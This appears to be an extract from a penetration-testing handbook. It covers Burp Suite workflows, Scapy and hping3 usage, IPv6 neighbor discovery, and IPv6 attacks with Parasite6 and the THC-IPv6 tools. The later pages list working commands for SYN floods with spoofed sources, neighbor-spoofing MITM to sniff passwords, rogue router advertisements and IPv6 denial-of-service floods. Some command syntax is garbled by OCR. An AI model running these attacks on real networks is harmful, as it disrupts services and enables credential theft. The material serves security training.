+    - Intruder - This allows you to perform customized automated attacks, to carry
+    out all kinds of testing tasks.
+
+    - Repeater - This is used to manually modify and reissue individual HTTP requests
+    over and over.
+
+    - Sequencer - This is used to analyse the quality of randomness in an application''s
+    session tokens.
+
+    - Decoder - This lets you transform bits of application data using common encoding
+    and decoding schemes.'
+  merge: -1
+  pgno: 100
+- img_proc: true
+  md: "Comparer - This is used to perform a visual comparison of bits of application\
+    \ data to find interesting differences.\n\nQuick steps of how to start Burp Suite:\n\
+    \n+   - Set up the proxy settings of Burp Suite. (Port number and IP address)\n\
+    - Configure the proxy settings on any browser on the network that will use Burp\
+    \ as proxy server\n- Once you connect to a web site via proxy, there will be a\
+    \ prompt notification on Burp suite and you can choose to forward the traffic\n\
+    \  - Note: Burp suite won't forward the traffic by default, it needs to be done\
+    \ manually\n- All traffic will be captured on Burp Suite\n- To replay the request\
+    \ on the server select the request and send it to repeater\n- On Repeater you\
+    \ can change the request and try sending the request to the web server with different\
+    \ parameters and test the response\n- Another feature is the Spider - Select the\
+    \ request that you want and send it to Spider to get more information\n\n# Getting\
+    \ Started With Burp Proxy\n\nBurp Proxy lies at the heart of Burp's user-driven\
+    \ workflow. It operates as a web proxy server between your browser and target\
+    \ applications, and lets you intercept, inspect and modify the raw traffic passing\
+    \ in both directions.\n\n**Note**: Using Burp Proxy may result in unexpected effects\
+    \ in some applications. Until you are fully familiar with its functionality and\
+    \ settings, you should only use Burp Proxy against non-production systems.\n\n\
+    To start getting to know Burp Proxy, carry out the following steps:\n\n+   - First,\
+    \ ensure that Burp is installed and running, and that you have configured your\
+    \ browser to work with Burp.\n- In Burp, go to the Proxy Intercept tab, and ensure\
+    \ that interception is on (if the button says \"Intercept is off\") then click\
+    \ it to toggle the interception status."
+  merge: -1
+  pgno: 101
+- img_proc: true
+  md: '3. In your browser, visit any URL. The browser will sit waiting until the request
+    completes.
+
+
+    4. In Burp, go to the Proxy Intercept tab. You should see your browser''s request
+    displayed for you to view and edit. Click through each of the message editor tabs
+    (Raw, Headers, etc.) to see the different ways of analysing the message.
+
+
+    5. Click the "Forward" button to send the request to the server. In most cases,
+    your browser will make more than one request in order to display the page (for
+    images, etc.). Look at each subsequent request and then forward it to the server.
+    When there are no more requests to forward, your browser should have finished
+    loading the URL you requested.
+
+
+    6. In your browser, click the Refresh button to reload the current page.
+
+
+    7. In Burp, this time edit the request in the Proxy Intercept tab. Change the
+    URL in the first line of the request so that a non-existent item is requested.
+    Forward the request (and any subsequent ones) to the server. Then look back in
+    your browser. Although your browser requested the same URL as before, you should
+    see a "Not found" message, because you changed the actual outgoing request on
+    the fly, within Burp.
+
+
+    8. In Burp, go to the Proxy History tab. This contains a table of all HTTP messages
+    that have passed through the Proxy. Select an item in the table, and look at the
+    HTTP messages in the request and response tabs. If you select the item that you
+    modified, you will see separate tabs for the original and modified requests.
+
+
+    9. Click on a column header in the Proxy History. This sorts the contents of the
+    table according to that column. Click the same header to reverse-sort on that
+    column, and again to clear the sorting and show items in the default order. Try
+    this for different columns.
+
+
+    10. Within the history table, click on a cell in the drop-down menu. This will
+    highlight that row in the selected column. In another row, double-click within
+    the Comment column and type a comment. You can use highlights and comments to
+    annotate the history and identify interesting items.
+
+
+    11. Above the history table there is a filter bar. Click on the filter bar to
+    show the options available. Try changing the filter settings in various ways,
+    and see the effect on what is shown in the history table. When'
+  merge: -1
+  pgno: 102
+- img_proc: true
+  md: 'the Proxy history has become very large, you can use the filter to hide certain
+    types of items, to help find items you are looking for.
+
+
+    +   Select an item in the history, and show the context menu (usually, by right-clicking
+    your mouse). The options on the context menu are used to drive your testing workflow
+    within Burp. Choose "Send to Repeater", and go to the Repeater tab. You will see
+    the selected request has been copied into the Repeater tool, for further testing.
+
+
+    +   Go to the Proxy Options tab, and look at all the options that are available.
+    These can be used to change the behaviour of the Proxy listeners, define rules
+    to determine what request and response messages are intercepted by the Proxy,
+    perform automatic modification of messages, and control the Proxy''s behaviour
+    in other ways.
+
+
+    # Using Burp Proxy
+
+
+    The Proxy tool lies at the heart of Burp''s user-driven workflow, and gives you
+    a direct view into how your target application works "under the hood". It operates
+    as a web proxy server, and sits as a man-in-the-middle between your browser and
+    destination web servers. This lets you intercept, inspect and modify the raw traffic
+    passing in both directions.
+
+
+    If the application employs HTTPS, Burp breaks the SSL connection between your
+    browser and the server, so that even encrypted data can be viewed and modified
+    within the Proxy.
+
+
+    # Getting Set Up
+
+
+    Setting up Burp and your browser to work with each other involves the following
+    elements.:
+
+
+    +   Proxy listener - Burp uses Proxy listeners to accept requests from your browser.
+    The default Burp listener, on port 8080 of your IPv4 loopback interface, is normally
+    sufficient for general-purpose testing. Burp will show an alert on startup if
+    it is not able to open this port (usually because another application is using
+    it). You can modify the default listener and add new ones via the Proxy listener
+    options.
+
+
+    +   Browser proxy configuration - You need to configure your browser to use the
+    Burp Proxy listener as its proxy server, for both HTTP and'
+  merge: -1
+  pgno: 103
+- img_proc: true
+  md: 'HTTPS protocols.
+
+
+    +   - Burp CA certificate - Since Burp breaks SSL connections between your browser
+    and servers, your browser will by default show a warning message if you visit
+    an HTTPS site via Burp Proxy. This is because the browser does not recognize Burp''s
+    SSL certificate, and infers that your traffic may be intercepted by a third-party
+    attacker. To use Burp effectively with SSL connections, you really need to install
+    Burp''s Certificate Authority master certificate in your browser, so that it trusts
+    the certificates generated by Burp.
+
+
+    When you have things set up, visit any URL in your browser, and go to the Intercept
+    tab in Burp Proxy. If everything is working, you should see an HTTP request displayed
+    for you to view and modify. You should also see entries appearing in the Proxy
+    history tab. You will need to forward HTTP messages as they appear in the Intercept
+    tab, in order to continue browsing.
+
+
+    # Intercepting Requests and Responses
+
+
+    The Intercept tab displays individual HTTP requests and responses that have been
+    intercepted by Burp Proxy for review and modification. This feature is a key part
+    of Burp''s user-driven workflow:
+
+
+    +   - Manually reviewing intercepted messages is often key to understanding the
+    application''s attack surface in detail.
+
+    - Modifying request parameters allows you to quickly identify common security
+    vulnerabilities.
+
+
+    Intercepted requests and responses are displayed in an HTTP message editor, which
+    contains numerous features designed to help you quickly analyse and manipulate
+    the messages.
+
+
+    By default, Burp Proxy intercepts only requests messages, and does not intercept
+    requests for URLs with common file extensions that are not directly interesting
+    when testing (images, CSS, and static JavaScript). You can change this behaviour
+    in the interception options. For example, you can configure Burp to only intercept
+    in-scope requests containing parameters, or to intercept all responses containing
+    HTML. Furthermore, you may often want to turn off Burp''s interception altogether,
+    so that all'
+  merge: -1
+  pgno: 104
+- img_proc: true
+  md: 'HTTP messages are automatically forwarded without requiring user intervention.
+    You can do this using the master interception toggle, in the Intercept tab.
+
+
+    # Using the Proxy History
+
+
+    Burp maintains a full history of all requests and responses that have passed through
+    the Proxy. This enables you to review the browser-server conversation to understand
+    how the application functions, or carry out key testing tasks. Sometimes you may
+    want to completely disable interception in the Intercept tab, and freely browse
+    a part of the application''s functionality, before carefully reviewing the resulting
+    requests and responses in the Proxy history.
+
+
+    Burp provides the following functions to help you analyse the Proxy history:
+
+
+    +   - The history table can be sorted by clicking on any column header (clicking
+    a header through ascending sort, descending sort, and unsorted). This lets quickly
+    group similar items and identify any anomalous items.
+
+    - You can use the display filter to hide items with various characteristics.
+
+    - You can annotate items with highlights and comments, to describe their purpose
+    or identify interesting items to come back to later.
+
+    - You can open additional views of the history using the context menu, to apply
+    different filters or help test access controls.
+
+
+    # Driving Your Testing Workflow
+
+
+    A key part of Burp''s user-driven workflow is the ability to send interesting
+    items between Burp tools to carry out different tasks. For example, having observed
+    an interesting request in the Proxy, you might:
+
+
+    +   - Quickly perform a vulnerability scan of just that request, using Burp Scanner.
+
+    - Send the request to Repeater to manually modify the request and reissue it over
+    and over.'
+  merge: -1
+  pgno: 105
+- img_proc: true
+  md: '+   * Send the request to Intruder to perform various types of automated customized
+    attacks.
+
+    * Send the request to Sequencer to analyse the quality of randomness in a token
+    returned in the response.
+
+
+    You can perform all these actions and various other using the context menus that
+    appear in both the Intercept tab and the Proxy history.
+
+
+    # Key Configuration Options
+
+
+    For more specialized testing tasks, or when working with unusual applications,
+    you may need to modify some of Burp Proxy''s numerous options:
+
+
+    +   * You might need to modify the Proxy listener, to bind to different interfaces,
+    handle server SSL certificates differently, or support invisible proxying for
+    non-proxy-aware clients.
+
+    * You can configure the Proxy to automatically modify HTTP responses in various
+    systematic ways; for example, to unhide hidden form fields, remove JavaScript
+    form validation, etc.
+
+    * You can configure match / replace rules to automatically change the content
+    of requests and responses.
+
+
+    # Using Burp Suite
+
+
+    The sections below describe the essentials of how to use Burp Suite within your
+    web application testing.
+
+
+    **Note:** Before starting to use Burp, you first need to get Burp running, configure
+    display settings, configure your browser and Burp to work together, and ideally
+    install Burp''s SSL CA certificate in your browser.
+
+
+    # Testing Workflow
+
+
+    Burp is designed to support the activities of a hands-on web application tester.
+    It lets you combine manual and automated techniques effectively, gives you complete
+    control over all of the actions that Burp performs, and'
+  merge: -1
+  pgno: 106
+- img_proc: true
+  md: 'provides detailed information and analysis about the applications you are testing.
+
+
+    Some users may not wish to use Burp in this way, and only want to perform a quick
+    and easy vulnerability scan of their application.
+
+
+    The diagram below is a high-level overview of the key parts of Burp''s user-driven
+    workflow. Click on each area of the diagram for more detail:
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_107_0.png)
+
+
+    # Recon and Analysis
+
+
+    The Proxy tool lies at the heart of Burp''s workflow. It lets you use your browser
+    to navigate the application, while Burp captures all relevant information and
+    lets you easily initiate further actions. In a typical test, the recon and analysis
+    phase involves the following tasks:'
+  merge: -1
+  pgno: 107
+- img_proc: true
+  md: '+   - Manually map the application - Using your browser working through Burp
+    Proxy
+
+
+    Note before performing any automated actions, it may be necessary to update various
+    aspects of Burp''s configuration, such as target scope and session handling.
+
+
+    +   - **Analyze the application''s attack surface** - The process of mapping the
+    application populates the Proxy history and Target site map with all of the information
+    that Burp has captured about the application. Both of these repositories contain
+    features to help you analyse the information they contain, and assess the attack
+    surface that the application exposes. Further, you can use Burp''s Target Analyser
+    to report the extent of the attack surface and the different types of URLs the
+    application uses.
+
+
+    # Tool Configuration
+
+
+    Burp contains a wealth of configuration options, which it is often necessary to
+    use at different stages of your testing, to ensure that Burp works with your target
+    application in the way you require. For example:'
+  merge: -1
+  pgno: 108
+- img_proc: true
+  md: '+   - Display - You can configure the font and character set used to display
+    HTTP messages, and also the font in Burp''s own UI.
+
+    - Target scope - The Target scope configuration tells Burp the items that you
+    are currently interested in and willing to attack. You should configure this early
+    in your testing, as it can control which items are displayed in the Proxy history
+    and Target site map, which messages are intercepted in the Proxy, and which items
+    may be spidered and scanned.
+
+    - Authentication - If the authentication server employs any platform level (HTTP)
+    authentication, you configure Burp to handle the authentication automatically.
+
+    - Session handling - Many applications contain features that can hinder automated
+    or manual testing, such as per-request tokens, and stateful multi-stage processes.
+    You can configure Burp to handle most of these situations seamlessly, using a
+    combination of session handling rules and macros.
+
+    - Saving and restoring state - You can save Burp''s current state at time, and
+    restore it later. You can also configure Burp to periodically backup its state
+    in the background, so that you always have a recent state file available to revert
+    to in the event of a crash.
+
+    - Task scheduling - You can configure Burp to schedule tasks at given times or
+    intervals, to allow you to work within specified testing windows.
+
+
+    # Vulnerability Detection and Exploitation
+
+
+    After completing your recon and analysis of the target application, and any necessary
+    configuration of Burp, you can begin probing the application for common vulnerabilities.
+    At the stage, it is often most effective to use several Burp tools at once, passing
+    requests between different tools to perform different tasks, and also going back
+    to your browser for some tests. Throughout Burp, you can use the context menu
+    to pass items between tools and carry out other actions.
+
+
+    In Burp''s default configuration, it automatically performs live passive scanning
+    of all requests and responses that pass through the Proxy. Before you begin actively
+    probing the application, you might find that Burp'
+  merge: -1
+  pgno: 109
+- img_proc: true
+  md: "Scanner has already recorded some findings that warrant closer investigation.\n\
+    \nBurp's tools can be used in numerous different ways to support the process of\
+    \ actively testing for vulnerabilities. Some examples are described below for\
+    \ different types of issues:\n\n+   - Input-based bugs - For issues like SQL injection,\
+    \ cross-site scripting, and file path traversal, you can use Burp in various ways:\n\
+    \  - You can perform active scans using Burp Scanner. You can select items anywhere\
+    \ in Burp, and initiate scans using the context menu. Or you can configure Burp\
+    \ to do live scanning of all in-scope requests passing through the Proxy.\n  -\
+    \ You can use Burp Intruder to perform fuzzing, using your own test strings\n\
+    \  - You can send individual requests to Burp Repeater, to manually modify and\
+    \ reissue the request and over.\n  - Having identified some types of bugs, you\
+    \ can actively exploit these using Burp Intruder. For example, you can often use\
+    \ the recursive payload to exploit SQL injection vulnerabilities.\n- Logic and\
+    \ design flaws - For issues unsafe use of client-side controls, failure to enforce\
+    \ account lockout, and the ability to skip key steps in multi-stage processes,\
+    \ you generally need to work manually:\n  - Typically, a close review of the Proxy\
+    \ history will identify the relevant requests that need to be investigated.\n\
+    \  - You can probe the application's handling of unexpected requests by issuing\
+    \ these individually using Burp Repeater, or by turning on Proxy intercept and\
+    \ manually changing requests on the fly using your browser.\n  - You can actively\
+    \ exploit many logic and design flaws using Burp Intruder. For example, Intruder\
+    \ can be used to enumerate valid usernames, guess passwords, cycle through predictable\
+    \ session tokens or password recovery tokens, or simply to reuse the request a\
+    \ large number of times (using the null payloads).\n  - Having confirmed a logic\
+    \ or design flaw, many of these can be actively exploited by using Burp Proxy's\
+    \ match/replace function, or session handling rules, to change requests in systematic\
+    \ ways."
+  merge: -1
+  pgno: 110
+- img_proc: true
+  md: '+   - Access control issues - Burp contains several features that can help
+    when testing for access control vulnerabilities:
+
+
+    +   - You can use the Compare site maps function for various tasks, including:
+    identifying functionality that is visible to one user and not another; testing
+    whether a low privileged user can access functions that should be restricted to
+    higher privileged users; and discovering where user-specific identifiers are being
+    used to segregate access to data by two users of the same type.
+
+
+    +   - You can use different browsers to access the application in different user
+    contexts, and use a separate Burp Proxy listener for each browser (using different
+    ports). You can then open additional Proxy history windows (via the context menu)
+    and set the display filter on each window to show only items received on a specific
+    listener port. As you use the application in each browser, each window will show
+    only the items for the associated user context. You can then use the "Request
+    in browser in current browser session" function (via the context menu) to switch
+    between browsers, to determine how they are handled in browser''s user context.
+
+
+    +   - Many privilege escalation vulnerabilities arise when the application passes
+    an identifier in a request parameter, and uses to identify the current user context.
+    You can actively exploit this type of vulnerability by using Burp Intruder to
+    cycle through identifiers in the appropriate format (e.g. using the numbers or
+    custom iterator payloads types) and extracting grep items to retrieve interesting
+    user-specific data from the application''s responses.
+
+
+    +   - Other vulnerabilities - Burp contains functions that can be used to deliver,
+    and often automate, virtually any task that arises when probing for other types
+    of vulnerabilities. For example:
+
+
+    +   - You can review the contents of the Target site map for information leakage
+    issues, using the Search and Find functions to assist you.
+
+
+    +   - Having identified a possible CSRF vulnerability, you can use the CSRF generator
+    to quickly create a proof-of-concept attack in HTML, then use the "Test in browser"
+    function to load the attack into your browser, and then review the browser results
+    and Proxy history to verify whether the attack was successful.'
+  merge: -1
+  pgno: 111
+- img_proc: true
+  md: '+   * You can use Burp Sequencer to analyse a sample of session tokens from
+    the application, and estimate the quality of their randomness.
+
+    * For some types of encrypted session tokens or other parameters, you can use
+    the bit flipper and ECB block shuffler payload types in Burp Intruder to blindly
+    modify the encrypted data in an attempt to meaningfully change the decrypted data
+    that the application processes.
+
+    * You can write your own custom Burp extensions to carry out more specialized
+    or customized tasks.'
+  merge: -1
+  pgno: 112
+- img_proc: true
+  md: "# Kali Linux on Raspberry Pi\n\n![](img/c6b688dca6570d17db3036b560ef0905_113_0.png)\n\
+    \nOne of the interesting features of Kali Linux is that there is a version to\
+    \ be installed on Raspberry Pi. The Raspberry Pi is a small pocket computer in\
+    \ a credit-card sized that plugs into your TV and a keyboard and it has all interfaces\
+    \ of a PC including SD, USB, Ethernet connectivity and even WIFI. \n\nYou can\
+    \ download the Kali customized version image for Raspberry Pi from cimageage.org.\
+    \ Once you download Kali image for ARM Raspberry Pi, installation can start. You\
+    \ need an SD card to write the image on. This can be done on Windows or Linux.\n\
+    \n+   * On Windows:\n  * Download Win32 Disk Image application and write the ISO\
+    \ file on the SD card\n* On Linux"
+  merge: -1
+  pgno: 113
+- img_proc: true
+  md: "+   ○ You can achieve this with the below command (Need to find the device\
+    \ name)\n  ○ dd if=/path/to/Kali.iso of=/dev/sdx\n* Once started to use Kali you\
+    \ can enable SSH and manage the device from your desk\n  ○ Using Xming you can\
+    \ have the GUI applications on your desktop with using putty as well."
+  merge: -1
+  pgno: 114
+- img_proc: true
+  md: "# Scapy - Packet Manipulation Tool - Capture, create, play, reply, discover\n\
+    \n| Eth | IP | TCP | Payload |\n|---|---|---|---|\n| 14 | 20 | 20 | |\n-- TCP\
+    \ MSS Ethernet MTU\n\nScapy is a powerful interactive packet manipulation tool,\
+    \ packet generator, network scanner, network discovery tool, and packet sniffer.\
+    \ Note that Scapy is a very low-level tool—you interact with it using the Python\
+    \ programming language. It provides classes to interactively create packets or\
+    \ sets of packets, manipulate them, send them over the wire, sniff other packets\
+    \ from the wire, and match answers and replies.\n\n+   * Run it with scapy command\
+    \ -- You can change on the packets/frames parameters and sections and send them\
+    \ with this tool\n* Example:\nsend(IP(src=\"192.168.1.55\",dst=\"192.168.1.10\"\
+    )/ICMP())/OurPayload\"\n* On the above example an ICMP packet will be sent from\
+    \ src to dst with the payload that we specify.\n* Using Scapy we need to define\
+    \ some variables:\n  * L2=Ether()\n  * L3=IP()\n  * L4=TCP())\n* Using L2, L3\
+    \ or L4 with any parameter will show the defined variable on the output screen\n\
+    * L2.show() or L3.show() or L4.show() -- Shows what is inside that protocol which\
+    \ can be defined\n* Below is an example of how you can use scapy:\n  * L2=Ether(src=\"\
+    01:23:45:67:89:ab\") --This will define the ipv6 source address on L2"
+  merge: -1
+  pgno: 115
+- img_proc: true
+  md: "+   ○ L2.show() -- Use this to confirm the change is done\n○ L3=IP(ttl=99,\
+    \ dst=\"192.168.1.1\")\n○ L3.show()\n○ del(L3.dst) -- This will delete the dst\
+    \ defined on L3 if you need to change or delete\n○ L4=TCP(sport=6783, dport=22,\
+    \ flags=\"A\")\n○ L4.show()\n○ Send=sendp(L2/L3/L4) - This will send the L2, L3,\
+    \ L4 packets all together.\n• Here are some other cases you use scapy:\n  ○ Sniff(iface=\"\
+    eth0\",prn=lambda x: x.show()) -- Sniff on eth0 and show the output\n  ○ Sniff(iface=\"\
+    eth0\",prn=lambda x: x.summary()) -- Same as above but just shows summary of packets\n\
+    \  ○ Sniff(filter=\"host 192.168.1.1\", count=5) -- Sniff only 5 results if it\
+    \ includes 192.168.1.1\n  ○ a[?] -- This will show the details of the packet captured\
+    \ on the above filtered command where \"?\" is the number of packet that you would\
+    \ like its details\n  ○ To get out of Scapy use Ctrl+D"
+  merge: -1
+  pgno: 116
+- img_proc: true
+  md: "# HPing 3\n\n![](img/c6b688dca6570d17db3036b560ef0905_117_0.png)\n\nHping is\
+    \ a command-line oriented TCP/IP packet assembler/analyser. The interface is inspired\
+    \ by the ping UNIX command, but hping isn't only able to send ICMP requests. It\
+    \ supports TCP, UDP, ICMP and RAW-IP protocols, has a traceroute mode, the ability\
+    \ to send files between a covered channel, and many other features.\n\n+   * Some\
+    \ of the functions of Hping are not limited to\n  * Port Scanning - Syn, ack,\
+    \ IP and others\n  * Host discovery, fingerprinting, sniffer, flooding, file transfer\n\
+    * Use “man hping3” to get more information\n* Some examples of using hping:\n\
+    * hping3 -S man-dest=example.com -p 80 -c 2 -- TCP syn request port 80 and 2 times\
+    \ only\n* hping3 -S 192.168.1.38 -p +50 -c 5 -- 5 requests to port 50 for 54 (It\
+    \ shows source port 50-54 on the output which is the response back from the destination)\n\
+    * hping3 -1 192.168.1.1 -xrand-dest -Ieth0 -- -1 means icmp, rand-dest will do\
+    \ the ping randomly, -1 will specify the interface\n* hping3 -1 192.168.1.1 -icmp-ts\
+    \ -c 2 -- icmp request for timestamp\n* hping3 -1 192.168.1.1 -icmp-addr -c 2\
+    \ -- Asking for Subnet Mask\n* hping3 -8 50-56 -S 8.8.8.8 --8 means scan, ports\
+    \ 50-56\n* hping3 -2 192.168.1.6 -p 80 -c 1 --2 means UDP\n* hping3 -F -P -U 192.168.1.38\
+    \ -c 3 -- F means modify the FIN flag, P is PUSH and U is URGENT\n* hping3 192.168.1.38\
+    \ -Q -p 139 -s --Q shows the sequence numbers"
+  merge: -1
+  pgno: 117
+- img_proc: true
+  md: "+   - hping3 -S 192.168.1.38 -a 192.168.1.254 -p 22 -flood -S is syn flag,\n\
+    -a is the source address, --flood will send the packets as fast as\npossible and\
+    \ flood the destination\n\n+   - hping3 -2 www.example.com -p ++44444 -T -n --T\
+    \ means traceroute but\n-2 is UDP\n\n+   - hping3 -S www.example.com -p 53 --\
+    \ Similar to traceroute with\nTCP. Press Ctrl+Z to stop\n\n+   - hping3 -S www.example.com\
+    \ -p 80 -T -ttl 13 -tr-keep-ttl -n -- We will\nget response only from hub #13\
+    \ of reaching the destination. This\ncan help to find out if there is a Load balancer\
+    \ and we get different IP\naddresses\n\n+   - hping3 -- Will go to the command\
+    \ prompt for hping\n  - hping3> hping send\n  “ip(saddr=192.168.1.55,daddr=192.168.1.38,ttl=15)+tcp(sport=678\n\
+    3,dportport=80,flags=s)” --- This will send a custom packet to the\nnetwork"
+  merge: -1
+  pgno: 118
+- img_proc: true
+  md: '# IPv6 neighbor discovery
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_119_0.png)
+
+
+    Neighbor Discovery Protocol (NDP) can be conceptualized as a toolbox used by IPv6
+    hosts to carry out various link-local operations. NDP itself does not describe
+    a wire-level protocol or packet structure, but rather establishes directions for
+    accomplishing routine tasks using certain algorithms and fine ICMPv6 message types.
+
+
+    Many of the capabilities provided by NDP are very similar to those found in IPv4''s
+    ARP and ICMPv4, while others are new implementations available only under IPv6.
+    RFC 4861 describes the nine functions of NDP in detail, but this article should
+    suffice as a high-level review. A packet capture of various IPv6 Neighbor Discovery
+    functions is available if you want to follow along with Wireshark.
+
+
+    # Router Discovery
+
+
+    Whereas IPv4 hosts must rely on manual configuration or DHCP to provide the address
+    of a default gateway, IPv6 hosts can automatically locate default routers on the
+    link. This is accomplished through the use of two ICMPv6'
+  merge: -1
+  pgno: 119
+- img_proc: true
+  md: 'messages: Router Solicitation (type 133) and Router Advertisement (type 134).
+    When first joining a link, an IPv6 host multicasts a router solicitation to all
+    the routers multicast group, and each router active responds by sending a router
+    advertisement with its address to all the nodes group.
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_120_0.png)
+
+
+    Router advertisements indicate paths out of the local link, but they also specify
+    additional information necessary to assist other NDP operations.
+
+
+    # Prefix Discovery
+
+
+    One of the options typically carried by a router advertisement is the Prefix Information
+    option (type 3). Each prefix information option lists an IPv6 prefix (subnet)
+    reachable on the local link. Remember that it is not uncommon for multiple IPv6
+    prefixes to reside on the same link, and routers may include more than one prefix
+    in each advertisement. A host which knows what prefixes are reachable on the link
+    can communicate directly with destinations in those prefixes without passing its
+    traffic through a router.
+
+
+    # Parameter Discovery
+
+
+    Another option included in router advertisements is the MTU option (type 5), which
+    informs hosts of the IP MTU to use. For example, this value is'
+  merge: -1
+  pgno: 120
+- img_proc: true
+  md: 'typically set to 1500 for Ethernet networks. However, not all link types have
+    a standardized MTU size. Including this option ensures all hosts know the correct
+    MTU to use.
+
+
+    Router advertisements also specify the default value hosts should use for the
+    IPv6 hop count. This isn''t an an option, but a field built into the router advertisement
+    message header.
+
+
+    # Address Auto-configuration
+
+
+    NDP provides mechanisms for a host to automatically configure itself with an address
+    from a prefix learned from a local router through prefix discovery. This is done
+    by concatenating a candidate learned prefix with the EUI-64 address of the host''s
+    interface. In this manner, a host can achieve stateless auto-configuration.
+
+
+    # Address Resolution
+
+
+    The function of address resolution was handled by ARP for IPv4, but is handled
+    by ICMPv6 for IPv6. In a process very similar to router discovery, two ICMPv6
+    messages are used: Neighbor Solicitation (type 135) and Neighbor Advertisement
+    (type 136). A host seeking the link layer address of a neighbor multicasts a neighbor
+    solicitation and the neighbor (if online) responds with its link layer address
+    in a neighbor advertisement.'
+  merge: -1
+  pgno: 121
+- img_proc: true
+  md: '![](img/c6b688dca6570d17db3036b560ef0905_122_0.png)
+
+
+    # ### Next-Hop Determination
+
+
+    In IPv4, next-hop determination is simply a procedure for performing longest-match
+    lookups on the host routing table and, for off-link destinations, the selection
+    of a default router.
+
+
+    # ### Neighbor Unreachability Detection
+
+
+    NDP is able to determine the reachability of a neighbor by examining clues from
+    upper-layer protocols (for example, received TCP acknowledgments, or by actively
+    performing address resolution (via ICMPv6) when certain thresholds are reached.
+
+
+    # ### Duplicate Address Detection
+
+
+    When a host first joins a link, it multicasts neighbor solicitations for its own
+    IPv6 address for a short period before attempting to use that address to communicate.
+    If it receives a neighbor advertisement in response, the host realizes that another
+    neighbor on the link is already using that address. The host will mark the address
+    as a duplicate and will not use it on the link.'
+  merge: -1
+  pgno: 122
+- img_proc: true
+  md: 'Note that this process is similar to IPv4 gratuitous ARP requests, but NDP
+    elegantly allows for detection of two hosts with the same address before both
+    hosts are actively sending traffic from the address.
+
+
+    # Redirection
+
+
+    A fifth type of ICMPv6 message, the Redirect (type 137), is used by routers to
+    either point hosts toward a more preferable router, or to indicate that the destination
+    actually resides on link. ICMPv4 provides the same capability with its own redirect
+    message.
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_123_0.png)'
+  merge: -1
+  pgno: 123
+- img_proc: true
+  md: '# MITM attack on IPv6 with Parasite 6
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_124_0.png)
+
+
+    We have shown you how to launch a MITM attack on IPv4 before. It is not more complicated
+    to initiate a MITM attack in an IPv6 environment.
+
+
+    IPv6 Neighbor Discovery (ND) is a set of messages and processes that determine
+    relationships between neighboring nodes. ND replaces Address Resolution Protocol
+    (ARP), Internet Control Message Protocol (ICMP) Router Discovery, and ICMP Redirect,
+    which are used in IPv4, and provides additional functionality. ND is described
+    in RFC 2461, "Neighbor Discovery for IP Version 6 (IPv6)."
+
+
+    ND is used by hosts to:
+
+
+    +   * Discover neighboring routers.
+
+    * Discover addresses, address prefixes, and other configuration parameters.
+
+
+    ND is used by routers to:
+
+
+    +   * Advertise their presence, host configuration parameters, and on-link prefixes.
+
+    * Inform hosts of a better next-hop address to forward packets by a specific destination.
+
+
+    Neighbor discovery operation in IPv6 can be used to initiate a MITM attack. Below
+    steps using Parasite 6 will show how to launch an MITM'
+  merge: -1
+  pgno: 124
+- img_proc: true
+  md: "attack in an IPv6 environment.\n\nParasite will send ICMP NDP solicitation/advertisement\
+    \ packets and\\advertise the MAC address to neighbors\n\n+   - On windows you\
+    \ can type netsh\n  - Interface ipv6\n  - Show neighbors -- This will show all\
+    \ ipv6 neighbors on Windows\n- First enable IPv6 forwarding\n  - echo 1 >/proc/sys/net/ipv6/conf/all/forwarding\
+    \ -- Enables IP forwarding\n- To run parasite6\n  - parasite6 -IR eth0 -- loops\
+    \ and respond the packets every 5 seconds, -R injects the destination of solicitation\n\
+    - Now if we check the ipv6 neighbors on windows, will see the MAC address of the\
+    \ router changed\n- Now you can run Wireshark and sniff the traffic\n- Again,\
+    \ all clear text passwords can be found out on Wireshark by Following TCP stream!"
+  merge: -1
+  pgno: 125
+- img_proc: true
+  md: '# IPv6 Tools from THC (The Hackers Choice)
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_126_0.png)
+
+
+    Many toolkits exist that allow you to exploit weaknesses in software and protocol
+    vulnerabilities. A toolkit can be thought of as a collection of programs that
+    allows an individual to test or break into a system.
+
+
+    One toolkit in particular maintained by Van Hauser of The Hacker’s Choice, called
+    THC-IPv6 allows you to “attack” weaknesses in the IPv6 and ICMP6 protocols.
+
+
+    Its primary purpose is to test network devices with active IPv6 interfaces. With
+    over 50 separate tools the toolkit allows you to perform such tasks like detect
+    IPv6 hosts, impersonate IPv6 routers and initiate denial of service attacks.
+
+
+    With experimentation and time you can practice on your own to cater the tool suite
+    to suit your needs. Members of The Hacker’s Choice and users of'
+  merge: -1
+  pgno: 126
+- img_proc: true
+  md: "the toolkit is always developing new tools and of course accepting\nsoftware\
+    \ contributions.\n\nSome of the functions of THC-IPv6 are:\n\n+   - Rogue IPv6\
+    \ RA (Router Advertisement)\n- Discover New IPv6 Hosts\n- NDP DAD Attack (Respond\
+    \ with IP address in use so system cannot\n get an IP)\n- NDP RA Flooding (Lots\
+    \ of router advertisement)\n- NDP NA Flooding (Neighbor advertisement flooding)\n\
+    - Implementation Checks - Check features, function on a device with\nipv6\n\n\
+    Some use cases of THC with IPv6 are below:\n\n+   - fake_router6 eth0 2001:db8:BAD::64\
+    \ -- This will send a fake router\nadvertisement to the network\n  - The windows\
+    \ client should have a IPv6 address in the network\n    specified in Kali\n  -\
+    \ On windows client (victim) run \"netsh interface ipv6 show route\"\n    will\
+    \ show the ipv6 routes\n- detect-new-ipv6 eth0 -- This will listen to the network\
+    \ and discover\nnew ipv6 addresses assigned to the device\n- dos-new-ipv6 eth0\
+    \ -- This will listen on eth0 and when receive a\nduplicate discover message it\
+    \ will respond with the message that ipv6\nis in use - As a result no new device\
+    \ can get IP address on the network\n- flood_router6 eth0 -- This will start flooding\
+    \ the network with router\nadvertisement\n  - If you check ifconfig on the computers\
+    \ on the network they will\n    receive lots of ipv6 addresses and networks!\n\
+    \  - This is a very serious Dos attack and will affect the devices on the\n  \
+    \  network\n- flood_advertise60 -- This will start flooding the network with\n\
+    Neighbor Advertisements and have similar effects as above command\n- Implementation6\
+    \ eth0 2001::1 -- This will check the device with\n2001::1 IP address and will\
+    \ return the results about what features are"
+  merge: -1
+  pgno: 127
+- img_proc: true
+  md: "+   * smurf6 eth0 2001::1 -- This will send a ping request to the multicast\
+    \ group (everyone on that network) from host 2001::1 and then every device will\
+    \ respond to 2001::1, with this way it will flood the device with 2001::1 IP address\n\
